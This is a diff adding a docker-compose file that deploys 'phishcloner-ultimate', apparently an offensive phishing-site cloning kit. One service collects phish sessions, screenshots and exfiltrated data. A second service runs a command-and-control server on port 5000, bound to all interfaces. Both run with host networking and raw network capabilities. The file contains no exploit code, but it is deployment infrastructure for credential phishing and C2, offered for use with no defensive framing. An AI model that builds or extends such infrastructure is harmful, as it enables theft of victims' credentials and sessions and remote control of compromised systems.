@@ -1,0 +1,41 @@
+version: '3.8'
+
+services:
+  phishcloner:
+    build: .
+    image: ghost1o1/phishcloner-ultimate:1.0.0
+    container_name: phishcloner-ultimate
+    hostname: phishcloner
+    restart: unless-stopped
+    network_mode: host
+    volumes:
+      - ./data:/app/data
+      - ./phish_sessions:/app/phish_sessions
+      - ./phish_screenshots:/app/phish_screenshots
+      - ./phish_exfil:/app/phish_exfil
+      - ./c2_data:/app/c2_data
+      - ./logs:/app/logs
+      - ./certs:/app/certs
+    environment:
+      - PC_VERSION=1.0.0
+      - PC_AUTOR=ghost1o1
+      - PC_MODE=serve
+    cap_add:
+      - NET_ADMIN
+      - NET_RAW
+    stdin_open: true
+    tty: true
+
+  c2:
+    build: .
+    image: ghost1o1/phishcloner-ultimate:1.0.0
+    container_name: phishcloner-c2
+    command: python3 c2/server.py --bind 0.0.0.0 --port 5000
+    network_mode: host
+    volumes:
+      - ./c2_data:/app/c2_data
+      - ./logs:/app/logs
+    environment:
+      - PC_MODE=c2
+    stdin_open: true
+    tty: true
